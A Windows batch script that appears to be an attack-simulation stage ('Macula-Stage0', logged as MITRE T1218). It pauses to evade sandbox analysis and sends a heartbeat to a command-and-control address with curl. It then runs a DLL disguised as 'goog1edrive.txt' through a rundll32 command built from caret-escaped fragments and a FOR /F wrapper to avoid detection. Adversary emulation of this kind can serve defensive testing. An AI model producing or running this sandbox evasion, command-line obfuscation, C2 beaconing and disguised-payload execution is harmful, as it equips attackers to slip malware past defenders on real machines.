@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET jkmyt=%APPDATA%\8280\a5f61b33
SET qlwzb=Macula-Stage0-8280
SET fgvhbn=https://10.0.0.49
SET zxcvfr=https://10.0.0.49/stage/2/icon.png?8280-7
SET mnbgyu=BALAM-S2BO
SET lkjhgt=7
SET poiuyh=goog1edrive.txt
SET qazwsx=8280

REM Initial delay to evade sandbox analysis - use mixed delay methods
timeout /t 45 /nobreak >nul
ping -n 8 127.0.0.1 >nul
CHOICE /C Y /N /D Y /T 6 >nul

REM Heartbeat to C2 - FIRST OPERATION AS REQUESTED - no obfuscation on curl
curl -k -s -o nul "%zxcvfr%"

REM Mixed delay between operations
ping -n 5 127.0.0.1 >nul
CHOICE /C Y /N /D Y /T 3 >nul

REM Change to output directory
cd /d "%jkmyt%" 2>nul

REM Random short delay
timeout /t 7 /nobreak >nul

REM Build heavily obfuscated rundll32 command using caret escapes and FOR execution
SET r1=r^u
SET r2=n^d
SET r3=l^l
SET r4=3^2
SET r5=^.^e
SET r6=x^e
SET fullrnd=%WINDIR%\System32\!r1!!r2!!r3!!r4!!r5!!r6!

REM Fragment DLL and entry point with heavy escaping
SET d1=!poiuyh!
SET d2=,^
SET d3=D^l
SET d4=l^M
SET d5=a^i^n

REM Execute via FOR /F to further obfuscate command line
SET result=1
SET err_detail=
FOR /F "tokens=*" %%A IN ('echo CALL "!fullrnd!" "!d1!!d2!!d3!!d4!!d5!"') DO (
    %%A 2>nul
)
IF NOT !ERRORLEVEL! EQU 0 (
    SET result=0
    SET err_detail=exec_failed_!ERRORLEVEL!
)

REM Random delay with variable calculation
SET /A rdelay=!RANDOM! %% 20 + 10
timeout /t !rdelay! /nobreak >nul
ping -n 4 127.0.0.1 >nul

REM TTP logging via Windows Event Log only (no file writes) - generate random event ID
SET /A evtid=!RANDOM! %% 9000 + 1000
eventcreate /L INFORMATION /SO MaculaCTEM /T SUCCESS /ID !evtid! /D "!mnbgyu!: !lkjhgt!-!qazwsx!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!" >nul 2>nul

REM Final delay before exit
CHOICE /C Y /N /D Y /T 4 >nul